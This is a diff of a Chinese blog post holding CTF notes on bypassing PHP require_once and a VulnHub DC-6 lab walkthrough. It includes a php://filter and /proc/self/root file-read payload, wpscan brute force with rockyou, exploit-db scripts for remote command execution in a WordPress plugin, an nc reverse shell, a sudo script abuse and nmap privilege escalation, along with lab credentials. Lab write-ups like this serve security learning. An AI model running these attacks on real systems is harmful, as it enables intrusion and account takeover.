@@ -360,8 +360,10 @@ TCP/IP套接字；
 <p>require和include之间有两点重要的区别:</p>
 <p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
 <p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
-<p><u><strong>下面是一篇关于require_once被使用后不能再使用怎么绕开的文章，本人在2022年5月校内Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
+<h5 id="require-once-多次包含"><a href="#require-once-多次包含" class="headerlink" title="require_once()多次包含"></a><code>require_once()</code>多次包含</h5><p><u><strong>下面是一篇关于require_once被使用后不能再使用怎么绕开的文章，本人在2022年5月Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
 <p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">`require_once()`</span><br><span class="line">在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过<span class="number">20</span>次软链接后可以绕过，外加伪协议编码一下：</span><br><span class="line"></span><br><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure></div>
+
 <p>下面为该题代码</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
 
@@ -1031,10 +1033,10 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
 <p>稍微等一会</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
-<p>admin用户密码没有找到，应该是最高权限的账号</p>
-<p>但是jerry和tom用户的密码知道了</p>
+<p><code>admin</code>用户密码没有找到，应该是最高权限的账号</p>
+<p>但是<code>jerry</code>和<code>tom</code>用户的密码知道了</p>
 <p>下面，我们就要开始找登录的页面了，一般是后台网站</p>
-<p>我们可以用dirsearch工具进行扫描看看</p>
+<p>我们可以用<code>dirsearch</code>工具进行扫描看看</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
 <p>发现网站</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
@@ -1758,18 +1760,13 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></p>
 <p>然后访问试试</p>
 <p>好了【但是好像有点卡】</p>
-<p>界面和DC2一样【梦回DC2，操作应该差不多】</p>
+<p>界面和<code>DC2</code>一样【梦回<code>DC2</code>，操作应该差不多】</p>
 <p><img src="/2022/08/29/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></p>
 <hr>
 <p>习惯看看<code>wappalyzer</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></p>
 <p>看到<code>CMS</code>是<code>WordPress 5.1.1</code></p>
 <p>想到可以利用一下这个版本的漏洞，拿到一些敏感信息</p>
-<p>再习惯<code>dirsearch</code>扫一下地</p>
-<p><img src="/2022/08/29/vulnhub/image-20221006224657736.png" alt="image-20221006224657736"></p>
-<p>发现有个<code>文件包含</code>目录，而且内容大小还有点东西</p>
-<p><img src="/2022/08/29/vulnhub/image-20221006224959855.png" alt="image-20221006224959855"></p>
-<p>【思考，不应该在这里查看到<code>flag</code>文件，因为这些靶机不是一般要提权拿权限吗，我现在状态的权限肯定是不够的】鼠鼠翻了一下就放弃了，大部分文件都没权限查看</p>
 <hr>
 <p>我们再看看网站上有没有可以利用的信息</p>
 <p><code>about us</code>里似乎全是文本内容没啥提示</p>
@@ -1785,10 +1782,207 @@ handler 指向RequestHandler
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line"><span class="selector-tag">mark</span></span><br><span class="line">graham</span><br><span class="line">sarah</span><br><span class="line">jens</span><br></pre></td></tr></table></figure></div>
 
 <p>我们创建一个<code>user.txt</code></p>
-<p>我们再找一个密码表，这里用cewl命令爬一下网站，看看能不能利用其中有没有密码</p>
+<p>哪在哪里登录呢？我们在开始页面并没有看到登录窗口</p>
+<p>我们用<code>dirb</code>扫一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span>wordy</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">找到</span><br><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></p>
+<hr>
+<h2 id="2-wpscan爆破密码"><a href="#2-wpscan爆破密码" class="headerlink" title="2.wpscan爆破密码"></a>2.wpscan爆破密码</h2><p>我们再找一个密码表，这里用和<code>DC2</code> <code>cewl</code>命令爬一下网站，看看能不能利用其中有没有密码</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure></div>
 
 <p>然后就得到一个密码【擦，难道和<code>dc2</code>一样的】</p>
+<p>然后我们开始进行爆破登录【注意需要<code>root</code>权限】</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                                               </span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></p>
+<p>结果肯定是不行的【肯定不和<code>DC2</code>一样】</p>
+<p>==&gt;</p>
+<p>所以这里我们需要找一个<strong>完整的密码字典</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">需要用到wordpress的密码字典，kali自带rockyou.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>wordy --usernames user.txt --passwords <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt -t <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>-t是添加线程数，默认是<span class="number">5</span>，多加几个可以更快一些</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这就跑的有点久了</p>
+<p><code>。。。。。。。【睡了一晚上，不知道好久跑出来的】</code></p>
+<p><code>【七千万密码】</code></p>
+<p><img src="/2022/08/29/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></p>
+<p>最后得到</p>
+<p><img src="/2022/08/29/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AVRASM"><figure class="iseeu highlight /avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">username:</span>mark</span><br><span class="line"><span class="symbol">password:</span>helpdesk01</span><br></pre></td></tr></table></figure></div>
+
+<p>虽然只有一个用户但是够了</p>
+<hr>
+<h2 id="3-登录网站找信息"><a href="#3-登录网站找信息" class="headerlink" title="3.登录网站找信息"></a>3.登录网站找信息</h2><p>登录后发现是一个<code>wordpress</code>的后台网站</p>
+<p><img src="/2022/08/29/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></p>
+<p>在左侧我们发现了一个新的东西叫做</p>
+<p><code>Activity monitor</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">是一款网站用户活动监控插件，我们用户登录的<span class="built_in">ip</span>和其他信息都会被监控</span><br><span class="line"></span><br><span class="line"><span class="comment">//那么我们是不是可以试试找找这个插件有没有漏洞，从而通过这个漏洞拿到shell或者其他更高权限用户的信息</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></p>
+<p><img src="/2022/08/29/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></p>
+<p>我们查一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></p>
+<p>发现果然是有的，只是不知道能不能利用</p>
+<p>我们主要找后面两个和<code>wordpress</code>相关的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line"><span class="number">45274</span>.html是命令注入</span><br><span class="line"><span class="number">50110</span>.<span class="keyword">py</span>是远程命令执行</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="1）50110-py【有问题，不建议用】"><a href="#1）50110-py【有问题，不建议用】" class="headerlink" title="1）50110.py【有问题，不建议用】"></a>1）50110.py【有问题，不建议用】</h3><p>感觉<code>py</code>更方便一些，我们先查看内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></p>
+<p>看来只需要<code>ip</code>，以及<code>用户名</code>和<code>密码</code>即可进入<code>shell</code></p>
+<p>我们运行一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>然后我按我的输入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.145</span></span><br><span class="line">mark</span><br><span class="line">helpdesk01</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></p>
+<p>进入<code>shell</code></p>
+<hr>
+<p>然后固定姿势，进入交互式<code>shell</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是会报错</p>
+<p>似乎不能使用<code>python</code>命令，一使用就退出<code>shell</code></p>
+<p><img src="/2022/08/29/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></p>
+<p>那就看起来有点难受了，再试试能不能进入稳定<code>shell</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">先</span><br><span class="line">ctrl+z</span><br><span class="line">然后执行</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span> ; <span class="built_in">fg</span> ; reset  </span><br></pre></td></tr></table></figure></div>
+
+<p>结果卡死了</p>
+<p>算了算了，就这样看吧</p>
+<p>【我这里把<code>py</code>脚本导入一个新的文件里（<code>1.py</code>），把我的ip，用户名，密码都写了进去，就不用退出了又重新输入了】</p>
+<hr>
+<p>先退到主目录看看有几个用户</p>
+<p>但是发现好像有点问题，似乎有的命令执行就和脚本冲突，那就用</p>
+<p><img src="/2022/08/29/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></p>
+<h3 id="2）45274-html"><a href="#2）45274-html" class="headerlink" title="2）45274.html"></a>2）45274.html</h3><p>那我们先不管它，我们还有一个命令注入的没有用，</p>
+<p>我们先查看一下内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></p>
+<p>我们把这个文件导入一个新文件中【1.html】</p>
+<p>主要是修改这里的网站网址和监听本地<code>ip</code>，改成我们的<code>wordy</code>和<code>kali</code>机的<code>ip</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost:<span class="number">8000</span><span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></p>
+<p>然后因为是<code>html</code>文件，我们可以直接用浏览器打开，</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></p>
+<p>当然也可以</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后以浏览器方式访问本地<code>ip:8008</code>，再打开里面<code>1.html</code>文件</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></p>
+<h4 id="nc监听拿shell"><a href="#nc监听拿shell" class="headerlink" title="nc监听拿shell"></a>nc监听拿shell</h4><p>然后我们发现有个</p>
+<p><code>Submit request</code>的按钮，看来是发送请求，然后<code>nc</code>反弹shell</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">注意监听端口是9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></p>
+<p>然后我们在浏览器点击一下<code>Submit request</code></p>
+<p><img src="/2022/08/29/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></p>
+<p>连接到 <code>shell</code></p>
+<p>这个比脚本的那个就更加方便一下了，</p>
+<hr>
+<p>固定姿势</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后进入稳定式shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">先ctrl+z</span><br><span class="line">然后执行</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span> ; <span class="built_in">fg</span> ; reset  </span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></p>
+<hr>
+<p>然后开始找找有没有其他用户的密码信息</p>
+<p>先到 <code>/home</code> 里查看一下，发现了除了<code>admin</code>其他三个用户目录</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></p>
+<p>我们先进我们登录成功的<code>mark</code>目录查看</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></p>
+<p>发现有个<code>things-to-do.txt</code>文本文件</p>
+<p>查看内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NESTEDTEXT"><figure class="iseeu highlight /nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Things to do</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation"></span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Restore full functionality for the hyperdrive (need to speak to Jens)</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Buy present for Sarah&#x27;s farewell party</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Add new user: graham - GSo7isUM1D4 - done</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Apply for the OSCP course</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Buy new laptop for Sarah&#x27;s replacement</span></span><br><span class="line"></span><br><span class="line">意思是：</span><br><span class="line"></span><br><span class="line">要做的事情：</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="string">恢复超光速引擎的全部功能（需要与 Jens 交谈）</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">为莎拉的告别派对购买礼物</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">添加新用户：graham - GSo7isUM1D4 - 完成</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">申请OSCP课程</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">为莎拉购买新的笔记本电脑</span></span><br><span class="line"></span><br><span class="line">//关键信息我们得到了graham用户的密码【我也想考OSCP，哭唧唧】</span><br></pre></td></tr></table></figure></div>
+
+<p>我们根据我们拿到<code>graham</code>的信息，登录<code>ssh</code></p>
+<p>【当然在原有<code>shell</code>里利用<code>su</code>命令切换用户<code>graham</code>也是可以的，但是<code>ssh</code>有颜色，看起来好看一些】</p>
+<p>【因为之前就看到运行着<code>ssh</code>，没必要再在登录一次网站，反正不是最高权限】</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">ssh graham@<span class="number">192.168</span><span class="number">.133</span><span class="number">.145</span> -p <span class="number">22</span>    <span class="comment">//靶机ip  ssh运行端口</span></span><br><span class="line">密码：GS<span class="meta">o7</span>isU<span class="name">M1</span>D<span class="number">4</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></p>
+<p>然后我们看看我们有哪些命令可以执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></p>
+<p>看到是有<code>jens</code>目录下一个脚本文件的运行权限，而且不需要<code>jens</code>的密码，就可以他的身份下运行了【<code>mark</code>我试了的，没有权限】</p>
+<h4 id="以其他用户身份运行脚本，实现切换用户"><a href="#以其他用户身份运行脚本，实现切换用户" class="headerlink" title="以其他用户身份运行脚本，实现切换用户"></a>以其他用户身份运行脚本，实现切换用户</h4><p>我们先查看一下内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></p>
+<p>发现是执行一些命令，</p>
+<p>但是我们的目的想获得<code>jens</code>的登录权限，我们在脚本文件中追加一些命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure></div>
+
+<p>这样的话当我们以<code>jens</code>身份运行这个脚本时，当执行<code>/bin/bash</code>时，就算我们现在是<code>graham</code>，也会切换成<code>jens</code>，这也得益于可以<code>nopasswd</code>运行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">sudo -u jens <span class="regexp">/home/</span>jens/backups.sh</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>注意哦，这里是需要以jens身份运行【毕竟他给了我们用他身份执行权限】才可以实现切换用户，如果直接运行还是graham用户，就如下图一样</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></p>
+<p>切换用户成功，</p>
+<p>我们先看看<code>jens</code>有哪些命令可以执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></p>
+<p>终于，发现了<code>root</code>的，我们可以执行<code>nmap</code>命令【只有管理员可以】，那么如何拿到权限呢</p>
+<h2 id="4-nmap提权"><a href="#4-nmap提权" class="headerlink" title="4.nmap提权"></a>4.nmap提权</h2><h3 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure></div>
+
+<p>之后执行:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure></div>
+
+<p>msf中的模块为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h3><p>较新版可使用 <code>--script</code> 参数：</p>
